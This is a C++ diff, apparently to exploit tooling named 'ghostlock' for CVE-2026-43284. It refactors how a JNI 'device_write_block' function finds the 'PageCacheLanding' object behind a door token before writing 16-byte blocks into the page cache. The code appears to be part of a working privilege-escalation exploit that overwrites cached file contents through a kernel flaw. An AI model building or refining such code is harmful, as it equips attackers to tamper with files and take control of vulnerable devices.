@@ -221,6 +221,9 @@ namespace ghostlock::jni {
      *
      *  @return 落地对象不可用、门不对、或 land_block 拒绝时为 false（上层给 block-refused）。
      */
+    /** Declared here; defined next to device_make_landing, where the surface table is in scope. */
+    backend::cve_2026_43284::landing::PageCacheLanding *landing_of_door(std::uint64_t door_token) noexcept;
+
     bool device_write_block(const Init43284Values &, const WriteBlock43284Values &request,
                             const std::uint64_t door_token, std::uint64_t &sequence,
                             void *) noexcept {
@@ -232,19 +235,20 @@ namespace ghostlock::jni {
                     ((g_session != nullptr) && g_session->up) ? 1 : 0,
                     request.block.size(), static_cast<unsigned long long>(request.offset));
         }
-        if (g_session == nullptr || !g_session->up || request.block.size() != 16U) {
+        auto *const landing = landing_of_door(door_token);
+        if (landing == nullptr || request.block.size() != 16U) {
             return false;
         }
         const std::size_t slot = static_cast<std::size_t>(door_token) - 1U;
         if (door_token == 0U || slot >= kMaxDoors || g_doors[slot].fd < 0) {
             return false;
         }
-        if (!g_session->landing.land_block(static_cast<std::uint64_t>(request.offset),
-                                          request.block.data())) {
+        if (!landing->land_block(static_cast<std::uint64_t>(request.offset),
+                                  request.block.data())) {
             return false;
         }
         sequence += 1U;
-        g_session->landing.adopt_sequence(static_cast<std::uint32_t>(sequence));
+        landing->adopt_sequence(static_cast<std::uint32_t>(sequence));
         return true;
     }
 
@@ -475,6 +479,8 @@ namespace ghostlock::jni {
         std::unique_ptr<backend::cve_2026_43284::landing::RemoteDoor> remote;
         backend::cve_2026_43284::landing::DoorOps *doors_ops = nullptr;
         bool target_remote = false;
+        /* The door this surface serves: a write can then find the landing that is actually up. */
+        std::size_t door_slot = 0U;
     };
     constexpr std::size_t kMaxSurfaces = 4U;
     std::unique_ptr<Surface> g_surfaces[kMaxSurfaces];
@@ -548,6 +554,7 @@ namespace ghostlock::jni {
         for (std::size_t index = 0U; index < kMaxSurfaces; ++index) {
             if (g_surfaces[index] == nullptr) {
                 auto surface = std::make_unique<Surface>();
+                surface->door_slot = target_slot;
                 surface->door = std::make_unique<PairedDoor>(g_doors[target_slot].fd, g_sockets[socket_slot]);
                 const bool remote = g_doors[target_slot].fd < 0;
                 if (remote) {
@@ -602,6 +609,19 @@ namespace ghostlock::jni {
      *
      *  @return 不透明 id（slot + 1）；没有拼接面或已建过 ⇒ 0。
      */
+    /** The landing behind a door, or null (a write needs the one that is actually up). */
+    backend::cve_2026_43284::landing::PageCacheLanding *landing_of_door(const std::uint64_t door_token) noexcept {
+        if (door_token == 0U) {
+            return nullptr;
+        }
+        const std::size_t want = static_cast<std::size_t>(door_token) - 1U;
+        for (std::size_t i = 0U; i < kMaxSurfaces; ++i) {
+            if (g_surfaces[i] != nullptr && g_surfaces[i]->door_slot == want && g_landings[i] != nullptr) {
+                return g_landings[i].get();
+            }
+        }
+        return nullptr;
+    }
     std::uint64_t device_make_landing(const std::uint64_t surfaceId) noexcept {
         if (surfaceId == 0U) {
             return 0U;
